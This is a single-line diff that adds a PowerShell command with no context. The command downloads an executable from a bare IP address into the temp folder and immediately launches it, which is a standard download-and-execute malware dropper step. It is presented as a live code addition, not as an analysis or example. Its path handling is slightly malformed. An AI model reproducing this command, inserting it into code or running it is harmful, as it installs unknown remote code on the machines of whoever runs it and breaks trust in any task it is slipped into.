@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://185.106.122.62/file.exe',"$env:TEMPfilex86.exe");Start-Process ("$env:TEMPfilex86.exe")
